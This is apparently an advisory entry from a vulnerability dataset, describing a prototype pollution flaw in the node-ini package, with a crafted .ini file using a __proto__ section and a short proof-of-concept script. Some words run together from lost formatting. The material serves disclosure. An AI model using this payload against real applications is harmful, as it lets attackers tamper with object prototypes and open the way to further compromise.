});

advisory_descriptions:
node-iniis a simple .ini config parser that supports sections, comments, arrays, and objects.Affected versions of this package are vulnerable to Prototype Pollution. Depending on if user input is provided, an attacker can overwrite and pollute the object prototype of a program by providing aninifile with the__proto__object.test.ini
[__proto__]
polluted = pollutedPoC.js
var ini = require('node-ini');
console.log({}.polluted);
ini.parse('./test.ini', function(err,data){
  if(err) console.log(err)
  else {
    console.log(data)
    console.log({}.polluted)
  }
});

